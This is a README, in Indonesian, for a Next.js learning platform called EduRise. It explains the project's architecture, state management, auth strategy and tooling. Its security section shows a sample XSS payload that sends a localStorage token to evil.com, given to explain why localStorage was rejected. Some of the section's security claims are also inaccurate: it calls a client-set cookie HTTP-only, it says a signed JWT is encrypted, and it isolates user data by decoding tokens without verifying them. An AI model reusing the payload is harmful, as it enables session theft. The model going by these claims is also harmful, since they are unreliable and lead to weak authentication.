# EduRise - Platform Pembelajaran Online

Platform pembelajaran online yang dibangun dengan Next.js 14, menampilkan sistem manajemen kursus, autentikasi pengguna, dan pengalaman belajar yang interaktif.

## 📋 Daftar Isi

- [Instalasi](#instalasi)
- [Arsitektur Aplikasi](#arsitektur-aplikasi)
- [State Management & Data Fetching](#state-management--data-fetching)
- [Strategi Keamanan](#strategi-keamanan)
- [Struktur Folder](#struktur-folder)
- [Tech Stack](#tech-stack)

---

## 🚀 Instalasi

### Prerequisites

- Node.js 18.x atau lebih tinggi
- **pnpm** (package manager yang digunakan project ini)

> ⚠️ **Penting**: Project ini menggunakan **pnpm**. Pastikan pnpm sudah terinstall:
>
> ```bash
> npm install -g pnpm
> ```

### Langkah Instalasi

1. **Clone repository**

```bash
git clone <repository-url>
cd edu-rise
```

2. **Install dependencies**

```bash
pnpm install
```

3. **Jalankan development server**

```bash
pnpm dev
```

4. **Buka aplikasi**

Akses aplikasi di browser: [http://localhost:3000](http://localhost:3000)

### Data Dummy untuk Testing

Aplikasi ini menggunakan **mock backend** dengan data disimpan di **IndexedDB** browser.

**Cara Testing:**

1. **Buat akun baru** melalui halaman Register (`/register`)
2. **Login** menggunakan akun yang sudah dibuat
3. Data akan tersimpan di IndexedDB browser (persistent)

> 💡 **Catatan**: Data akan hilang jika IndexedDB browser dihapus (clear browser data)

---

## 🏗️ Arsitektur Aplikasi

### Keputusan Arsitektur Utama

#### 1. **App Router (Next.js 14)**

Menggunakan App Router Next.js 14 untuk memanfaatkan fitur-fitur terbaru:

- **Server Components**: Mengurangi JavaScript bundle size di client
- **Streaming & Suspense**: Loading state yang lebih baik
- **Route Groups**: Organisasi route yang lebih fleksibel dengan `(dashboard)` dan `(auth)`
- **Middleware**: Implementasi route protection yang efisien

#### 2. **Pemisahan Komponen**

Struktur komponen dibagi menjadi 3 kategori utama:

**a. Features Components (`components/features/`)**

- Komponen spesifik untuk fitur tertentu (auth, courses, dashboard, profile)
- Business logic terikat dengan domain tertentu
- Contoh: `LoginForm`, `CourseCardItem`, `FilterSidebar`

**b. Shared Components (`components/shared/`)**

- Komponen reusable yang tidak terikat domain spesifik
- Dapat digunakan di berbagai fitur
- Contoh: `SectionContent`, `StateStatus`, `TabNavigation`

**c. UI Components (`components/ui/`)**

- Komponen presentational murni (pure UI)
- Tidak memiliki business logic
- Highly reusable dan configurable
- Contoh: `Button`, `Input`, `Icon`

**Alasan Pemisahan:**

- **Separation of Concerns**: Setiap layer punya tanggung jawab yang jelas
- **Reusability**: UI components bisa dipakai di mana saja tanpa dependency
- **Maintainability**: Mudah mencari dan mengupdate komponen
- **Scalability**: Struktur yang jelas untuk project yang berkembang

#### 3. **Mock Backend dengan MSW**

Menggunakan Mock Service Worker (MSW) untuk simulasi API:

**Alasan:**

- **Development Paralel**: Frontend bisa develop tanpa tunggu backend
- **Testing**: Mudah test berbagai skenario (success, error, edge cases)
- **Offline Development**: Tidak bergantung pada koneksi internet atau server external
- **Consistent Data**: Data dummy yang konsisten untuk semua developer

**Implementasi:**

- Handler API di `mocks/handlers.ts`
- IndexedDB untuk persistensi data (simulasi database)
- Support full CRUD operations

#### 4. **Custom Hooks Pattern**

Setiap fitur memiliki custom hooks untuk encapsulate logic:

- `useAuth` - Authentication logic
- `useMyCourses` - Course management
- `useCourseList` - Course fetching dengan filtering
- `useUpdatePassword` - Password update logic

**Benefits:**

- **Code Reuse**: Logic bisa dipakai di berbagai components
- **Testability**: Hooks bisa ditest secara isolated
- **Separation**: UI terpisah dari business logic

---

## 📊 State Management & Data Fetching

### React Query (TanStack Query)

**Keputusan:** Menggunakan React Query sebagai state management untuk **server state**.

#### Alasan Pemilihan React Query:

**1. Server State vs Client State**

```typescript
// Server State (managed by React Query)
- User data
- Courses list
- My courses
- Categories

// Client State (managed by useState/Context)
- UI state (modals, drawers)
- Form state (React Hook Form)
- Loading states (local)
```

**2. Built-in Features**

- ✅ **Automatic Caching**: Data di-cache otomatis, mengurangi request redundan
- ✅ **Background Refetching**: Data selalu fresh tanpa user action
- ✅ **Optimistic Updates**: UI update instant sebelum API response
- ✅ **Request Deduplication**: Multiple request ke endpoint sama dijadikan 1
- ✅ **Garbage Collection**: Cache yang tidak terpakai otomatis dibersihkan
- ✅ **Pagination & Infinite Scroll**: Built-in support

**3. Developer Experience**

```typescript
// Tanpa React Query (manual)
const [data, setData] = useState(null);
const [loading, setLoading] = useState(false);
const [error, setError] = useState(null);

useEffect(() => {
  setLoading(true);
  fetch('/api/courses')
    .then((res) => res.json())
    .then((data) => setData(data))
    .catch((err) => setError(err))
    .finally(() => setLoading(false));
}, []);

// Dengan React Query ✅
const { data, isLoading, error } = useQuery({
  queryKey: ['courses'],
  queryFn: getCourses,
});
```

**4. Performance Optimization**

- **Stale While Revalidate**: Tampilkan cache dulu, fetch di background
- **Window Focus Refetching**: Auto-refetch pas user kembali ke tab
- **Retry Logic**: Auto-retry pas request gagal
- **Query Invalidation**: Selective cache invalidation

#### Mengapa TIDAK Menggunakan Redux/Zustand?

**Redux/Zustand cocok untuk:**

- Complex client-side state (shopping cart, theme, preferences)
- State yang perlu diakses dari banyak unrelated components
- State yang tidak sync dengan server

**Aplikasi ini:**

- Mayoritas state adalah server state (courses, user data)
- React Query sudah handle caching & synchronization
- Client state yang ada cukup simple (form, UI toggles) → `useState` cukup

**Kesimpulan:** Menggunakan Redux/Zustand untuk server state adalah **overkill** dan **anti-pattern**.

#### Strategy: Hybrid Approach

```
Server State → React Query
  - User data
  - Courses
  - Categories
  - My courses

Client State → useState/useReducer
  - Form state (React Hook Form)
  - Modal/Drawer open state
  - Local filters & search

Shared Client State (future) → Context/Zustand
  - Theme
  - Language preferences
  - Global notifications
```

---

## 🔐 Strategi Keamanan

### 1. Token Authentication (Simulasi)

#### Penyimpanan Token: Cookies vs localStorage

**Pilihan:** **HTTP-Only Cookies** (disimulasikan dengan `cookies-next`)

#### Perbandingan:

| Aspek                | localStorage      | HTTP-Only Cookies         |
| -------------------- | ----------------- | ------------------------- |
| **XSS Attack**       | ❌ Vulnerable     | ✅ Protected              |
| **CSRF Attack**      | ✅ Not vulnerable | ⚠️ Vulnerable (mitigable) |
| **JavaScript Akses** | ✅ Ya             | ❌ Tidak                  |
| **Auto-send**        | ❌ Manual         | ✅ Automatic              |
| **Size Limit**       | ~5-10MB           | ~4KB                      |

#### Implementasi di Aplikasi:

```typescript
// Setting cookie (simulasi HTTP-Only)
setCookie('token', jwtToken, {
  maxAge: 60 * 60 * 24, // 24 jam
  path: '/',
  sameSite: 'strict', // CSRF protection
  // secure: true, // Enable di production (HTTPS only)
});
```

**Alasan:**

1. **XSS Protection**: Token tidak bisa diakses via `document.cookie` dari JavaScript
2. **Automatic Sending**: Browser auto-attach cookie ke setiap request
3. **SameSite Policy**: Mencegah CSRF attack
4. **Production Ready**: Pattern yang sama dengan real-world apps

#### Alternative yang TIDAK Dipilih:

**localStorage:**

```typescript
// ❌ VULNERABLE TO XSS
localStorage.setItem('token', token);

// Attacker bisa inject:
<script>
  fetch('https://evil.com?token=' + localStorage.getItem('token'))
</script>
```

**sessionStorage:**

- Same vulnerability dengan localStorage
- Data hilang pas tab ditutup (UX buruk)

### 2. Middleware Proxy untuk Route Protection

Menggunakan Next.js Middleware (`proxy.ts`) untuk protect routes:

**Implementasi:**

```typescript
// proxy.ts
export const proxy = (request: NextRequest) => {
  const token = request.cookies.get('token')?.value;
  const path = nextUrl.pathname;

  const isPrivateRoute = privateRoutes.some((route) => {
    const pattern = route.replace(/\[.*?\]/g, '[^/]+');
    return new RegExp(`^${pattern}$`).test(path);
  });

  const isAuthRoute = authRoutes.some((route) => {
    const pattern = route.replace(/\[.*?\]/g, '[^/]+');
    return new RegExp(`^${pattern}$`).test(path);
  });

  // Redirect ke root jika user sudah login tapi akses auth route
  if (token && isAuthRoute) {
    return NextResponse.redirect(new URL(ROOT_PATH, url));
  }

  // Redirect ke login jika user belum login tapi akses private route
  if (!token && isPrivateRoute) {
    return NextResponse.redirect(new URL(LOGIN_PATH, url));
  }

  return NextResponse.next();
};
```

**Fungsi Middleware:**

- ✅ **Server-side validation**: Validasi dilakukan di server sebelum page load
- ✅ **Prevent unauthorized access**: Block akses ke protected routes tanpa token
- ✅ **Auto-redirect authenticated users**: User yang sudah login diarahkan ke dashboard jika akses `/login` atau `/register`
- ✅ **Dynamic route matching**: Support dynamic routes dengan regex pattern
- ✅ **Better UX**: Instant redirect tanpa flash content

### 3. JWT Token (Simulasi)

Menggunakan `jose` library untuk encode/decode JWT:

```typescript
// Generate token
const token = await new SignJWT({ email: user.email })
  .setProtectedHeader({ alg: 'HS256' })
  .setExpirationTime('24h')
  .sign(secret);
```

**Security Features:**

- ✅ Expiration time (auto-logout setelah 24 jam)
- ✅ Signature verification
- ✅ Payload encryption

### 4. Data Isolation per User

Setiap user hanya bisa akses data mereka sendiri:

```typescript
// Mock API handler
const decoded = jwtDecode<{ email: string }>(token);
const userCourses = allCourses.filter(
  (course) => course.email === decoded.email
);
```

### 5. Input Validation

Menggunakan Zod schema untuk validasi input:

```typescript
const loginSchema = z.object({
  email: z.string().email('Email tidak valid'),
  password: z
    .string()
    .min(8, 'Password minimal 8 karakter')
    .regex(/[A-Z]/, 'Harus ada huruf besar'),
});
```

**Benefits:**

- ✅ Type-safe validation
- ✅ Runtime validation
- ✅ Prevent injection attacks

---

## 📁 Struktur Folder

```
edu-rise/
├── app/                          # Next.js App Router
│   ├── (auth)/                  # Auth routes (login, register)
│   │   ├── login/
│   │   └── register/
│   ├── (dashboard)/             # Protected routes
│   │   ├── courses/
│   │   ├── profile/
│   │   └── page.tsx            # Dashboard home
│   └── layout.tsx
│
├── components/
│   ├── features/                # Feature-specific components
│   │   ├── auth/               # Login, Register forms
│   │   ├── courses/            # Course list, filters
│   │   ├── dashboard/          # Dashboard widgets
│   │   └── profile/            # Profile forms
│   ├── shared/                  # Shared reusable components
│   │   ├── course-card-item/
│   │   ├── layout/
│   │   └── section-content/
│   └── ui/                      # Pure UI components
│       ├── button/
│       ├── input/
│       └── icon/
│
├── lib/
│   ├── hooks/                   # Custom React hooks
│   │   ├── courses/
│   │   └── useAuth.ts
│   ├── types/                   # TypeScript types
│   ├── helpers/                 # Utility functions
│   ├── axios.ts                # Axios instance
│   ├── index-db.ts             # IndexedDB operations
│   └── tanstack-query.ts       # React Query setup
│
├── mocks/
│   ├── handlers.ts              # MSW API handlers
│   ├── mockCourses.ts          # Mock data
│   └── browser.ts              # MSW browser setup
│
├── schemas/                     # Zod validation schemas
│   ├── auth.schema.ts
│   └── profile.schema.ts
│
├── services/                    # API service functions
│   ├── auth.service.ts
│   ├── course.service.ts
│   └── profile.service.ts
│
└── routes.ts                    # Route constants
```

### Penjelasan Struktur:

**Route Groups `(folder)`:**

- Organisasi routes tanpa mempengaruhi URL
- `(auth)` dan `(dashboard)` untuk layouts berbeda

**Feature-based Organization:**

- Setiap feature punya folder sendiri
- Mudah untuk code splitting dan lazy loading

**Separation of Concerns:**

- `services/` - API calls
- `lib/hooks/` - Business logic
- `components/` - UI presentation
- `schemas/` - Validation rules

---

## 🛠️ Tech Stack

### Core

- **Next.js 14** - React framework dengan App Router
- **React 18** - UI library dengan Server Components
- **TypeScript** - Type safety

### Styling

- **Tailwind CSS** - Utility-first CSS
- **classnames** - Conditional className utility

### State Management & Data Fetching

- **TanStack Query (React Query)** - Server state management
- **React Hook Form** - Form state management
- **Zod** - Schema validation

### Mock Backend

- **MSW (Mock Service Worker)** - API mocking
- **idb** - IndexedDB wrapper untuk persistensi data
- **jose** - JWT encoding/decoding

### Development Tools

- **ESLint** - Code linting
- **Prettier** - Code formatting
- **TypeScript** - Static type checking
- **Husky** - Git hooks untuk enforce code quality
- **Commitlint** - Conventional commit message validation

---

## 🎯 Fitur Utama

- ✅ Autentikasi & Otorisasi (simulasi)
- ✅ Manajemen Kursus (browse, filter, search)
- ✅ My Courses (add, track progress)
- ✅ Profile Management
- ✅ Responsive Design (mobile-first)
- ✅ Loading & Error States
- ✅ Toast Notifications
- ✅ Route Protection
- ✅ Data Persistence (IndexedDB)

---

## 📝 Catatan Penting

### Simulasi vs Production

Aplikasi ini menggunakan **mock backend** untuk development. Untuk production:

1. Replace MSW handlers dengan real API calls
2. Implement proper backend authentication
3. Enable HTTPS dan secure cookies
4. Add rate limiting & request throttling
5. Implement proper error logging (Sentry, etc.)

### Optimisasi yang Diimplementasikan

- ✅ React.memo untuk prevent unnecessary re-renders
- ✅ useCallback untuk stable function references
- ✅ React Query caching untuk reduce API calls
- ✅ Per-card loading states untuk better UX
- ✅ Debounced search untuk reduce requests
- ✅ Lazy loading untuk components (dynamic imports)

---

## � Git Hooks & Code Quality

### Husky

Project ini menggunakan **Husky** untuk menjalankan git hooks otomatis:

**Pre-commit Hook:**

- Menjalankan **lint-staged** untuk lint & format file yang di-stage
- Memastikan code yang di-commit sudah sesuai standard (ESLint + Prettier)
- Mencegah code yang error masuk ke repository

**Commit-msg Hook:**

- Menjalankan **commitlint** untuk validasi format commit message
- Enforce conventional commit format: `<type>(<scope>): <description>`
- Contoh valid: `feat(courses): add filter by category`

**Conventional Commit Types:**

```
feat:     Fitur baru
fix:      Bug fix
chore:    Maintenance/update dependencies
refactor: Code refactoring tanpa mengubah behavior
docs:     Update dokumentasi
style:    Formatting, missing semicolons, etc.
test:     Menambahkan test
```

**Benefits:**

- ✅ Consistent code style across team
- ✅ Clean git history
- ✅ Automated code quality checks
- ✅ Prevent bad commits

---

## 📄 License

MIT License - free to use and modify
